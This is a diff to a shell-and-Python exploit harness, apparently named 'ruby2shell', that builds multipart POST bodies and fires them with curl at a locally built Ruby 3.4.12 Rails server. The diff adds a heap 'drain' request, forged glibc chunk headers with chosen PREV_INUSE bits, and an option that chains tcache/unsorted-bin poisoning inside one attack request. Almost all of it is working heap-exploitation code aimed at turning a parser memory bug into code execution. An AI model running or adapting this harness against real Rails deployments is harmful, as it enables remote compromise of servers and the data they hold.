@@ -26,13 +26,13 @@ RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
 N="${RUBY2SHELL_CLAIM_N:-588}"
 TAGP="${RUBY2SHELL_CLAIM_TAG:-sc588}"
 PLANT_SPEC="${RUBY2SHELL_CLAIM_PLANT:-946x24}"
+DRAIN_SPEC="${RUBY2SHELL_CLAIM_DRAIN:-}"
 CLAIM_LIST="${RUBY2SHELL_CLAIM_PARTS:-824,2616,3032,3896}"
 COUNT="${RUBY2SHELL_CLAIM_COUNT:-12}"
 GAP="${RUBY2SHELL_CLAIM_GAP:-0}"
 BASE=4810
 export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
 PFX="$EV/stock-rails-$TAGP"
-
 if [ "${1:-}" = "--one" ]; then
   i="$2"; PORT=$((BASE + i)); TAG="$TAGP-$i"
   LOG="$EV/stock-rails-$TAG.server.log"
@@ -58,6 +58,17 @@ if [ "${1:-}" = "--one" ]; then
     kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null; exit 0
   fi
   touch "$ARM"
+  # optional pre-plant drain (wall 2026-11-25 fourteenth push): benign
+  # embed-legal parts whose parse slices+values consume the recycled
+  # 0x620/0x810-class holes so the PLANT's chunks allocate contiguously
+  # from the top; the drain's own chunks stay live (sweep persistence)
+  P0=NA
+  if [ -n "$DRAIN_SPEC" ] && [ -f "$PFX.drain.body" ]; then
+    P0=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
+      -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
+      --data-binary "@$PFX.drain.body" -o "$EV/stock-rails-$TAG.drain.html" \
+      -w '%{http_code}' 2>>"$LOG")
+  fi
   if [ "${RUBY2SHELL_CLAIM_NO_PLANT:-0}" = 1 ]; then
     P1=NA
   else
@@ -104,7 +115,7 @@ if [ "${1:-}" = "--one" ]; then
     kill "$PID" 2>/dev/null
   fi
   wait "$PID" 2>/dev/null
-  echo "$TAG plant=$P1 attack=$P2 claim=$P3 probe=$P4 up=$A1 alive=$ALIVE" >> "$PFX.summary"
+  echo "$TAG drain=$P0 plant=$P1 attack=$P2 claim=$P3 probe=$P4 up=$A1 alive=$ALIVE" >> "$PFX.summary"
   exit 0
 fi
 
@@ -120,7 +131,8 @@ fi
 rm -f "$PFX".*.body "$EV"/stock-rails-"$TAGP"-*.{server.log,html,maps,pid} \
       "$PFX.summary" "$EV"/stock-rails-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null
 
-EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" CLAIM_LIST="$CLAIM_LIST" \
+EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" DRAIN_SPEC="$DRAIN_SPEC" \
+CLAIM_LIST="$CLAIM_LIST" \
 CLAIM_MODE="${RUBY2SHELL_CLAIM_MODE:-strip}" \
 python3 - "$N" <<'PY'
 import sys, os
@@ -137,29 +149,30 @@ if mode == 'poison':
     # poison arm: sub-embed-floor filler parts before _method provide pure
     # object pressure (zero big mallocs, zero pool consumption) so the
     # young-generation sweep of the PREVIOUS plant request's params fires
-    # mid-parse, freeing the planted chunks into tcache[0x410]/unsorted
-    # before the upcase; the f filler keeps the geometry tail
-    parts = []
+    # mid-parse, freeing the planted chunks into tcache/unsorted before
+    # the upcase
+    attack_parts = []
     for grp in os.environ.get('FILLER_SPEC', '').split(','):
         if not grp:
             continue
         size, count = (int(v, 0) for v in grp.split('x'))
         for _ in range(count):
-            parts.append(part(f'g{len(parts)}'.encode(), b'g' * size, AB))
+            attack_parts.append(
+                part(f'g{len(attack_parts)}'.encode(), b'g' * size, AB))
     for grp in os.environ.get('HONEYPOT_SPEC', '').split(','):
         if not grp:
             continue
         size, count = (int(v, 0) for v in grp.split('x'))
         for _ in range(count):
-            parts.append(part(f'y{len(parts)}'.encode(), b'y' * size, AB))
-    parts.append(part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
+            attack_parts.append(
+                part(f'y{len(attack_parts)}'.encode(), b'y' * size, AB))
+    attack_parts.append(
+        part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
 else:
     drain = (pattern * ((1024 + 15) // 16))[:1024]
-    parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
-    parts.append(part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
-parts.append(part(b'f', (pattern * 16)[:256], AB))
-open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
-    b'\r\n'.join(parts) + b'\r\n--XB--\r\n')
+    attack_parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
+    attack_parts.append(
+        part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
 def p64(v):
     return v.to_bytes(8, 'little')
 def plant_content(size):
@@ -169,10 +182,16 @@ def plant_content(size):
     # grown victim, covering both victim-class variants
     if mode == 'poison':
         grown = int(os.environ.get('POISON_GROWN', '0x450'), 0)
-        forge = p64(grown) + p64(0x91)
-        # three forge pairs at +0x20/+0x30/+0x40 cover the check qwords
-        # for every victim-class variant
-        return (b'p' * 0x20 + forge * 3 + b'p' * (size - 0x50))
+        # the forged successor size must carry PREV_INUSE CLEAR for a
+        # freed-in-unsorted victim (glibc "invalid next->prev_inuse"
+        # check, measured 2026-11-25); POISON_NEXT=P|size for the
+        # in-use-variant arms
+        nxt = int(os.environ.get('POISON_NEXT', '0x90'), 0)
+        forge = p64(grown) + p64(nxt)
+        # four forge pairs at +0x10/+0x20/+0x30/+0x40 cover the check
+        # qwords for victim classes 0x620..0x640 (the successor content
+        # offset where the grown boundary lands)
+        return (b'p' * 0x10 + forge * 4 + b'p' * (size - 0x50))
     if size >= 864:
         return (b'p' * 848 + p64(0) + p64(0x91) + b'p' * (size - 864))
     return b'p' * size
@@ -210,6 +229,17 @@ for grp in os.environ['PLANT_SPEC'].split(','):
         pp.append(part(f'p{len(pp)}'.encode(), plant_content(size), AB))
 open(f'{ev}/stock-rails-{tag}.plant.body', 'wb').write(
     b'\r\n'.join(pp) + b'\r\n--XB--\r\n')
+dp = []
+for grp in os.environ.get('DRAIN_SPEC', '').split(','):
+    if not grp:
+        continue
+    size, count = (int(v, 0) for v in grp.split('x'))
+    for _ in range(count):
+        # plain content: drains recycled holes, forges irrelevant
+        dp.append(part(f'd{len(dp)}'.encode(), b'd' * size, AB))
+if dp:
+    open(f'{ev}/stock-rails-{tag}.drain.body', 'wb').write(
+        b'\r\n'.join(dp) + b'\r\n--XB--\r\n')
 cp = []
 for v in os.environ['CLAIM_LIST'].split(','):
     if not v:
@@ -244,6 +274,20 @@ if mode == 'poison':
             hp.append(part(f'h{len(hp)}'.encode(), b'h' * size, AB))
     open(f'{ev}/stock-rails-{tag}.churn.body', 'wb').write(
         b'\r\n'.join(hp) + b'\r\n--XB--\r\n')
+    # ATTACK_CHAIN: ride the claim and probe parts inside the attack
+    # body, after _method — the unsorted re-bin, the exact-fit claim pop
+    # and the poisoned-entry pops all complete inside the attack request,
+    # before any render allocation can consume the grown victim
+    if os.environ.get('ATTACK_CHAIN', '0') == '1':
+        attack_parts.extend(cp)
+        attack_parts.extend(qp)
+    attack_parts.append(part(b'f', (pattern * 16)[:256], AB))
+    open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
+        b'\r\n'.join(attack_parts) + b'\r\n--XB--\r\n')
+else:
+    attack_parts.append(part(b'f', (pattern * 16)[:256], AB))
+    open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
+        b'\r\n'.join(attack_parts) + b'\r\n--XB--\r\n')
 PY
 
 for f in "$PFX.attack.body" "$PFX.plant.body" "$PFX.claim.body"; do
